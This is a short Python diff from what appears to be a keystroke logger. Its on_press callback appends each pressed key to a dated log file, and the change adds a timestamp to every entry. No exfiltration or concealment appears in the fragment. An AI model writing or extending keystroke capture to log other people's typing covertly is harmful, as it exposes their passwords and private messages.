@@ -21,7 +21,7 @@ def on_press(key):
     key = str(key)
     now = dt.now()
     with open(f'Logs/{now.month}/{now.day}.txt', 'a') as f:
-        f.write(key + '\n')
+        f.write(F'{get_time()} {key}\n')
         f.close()
  
 
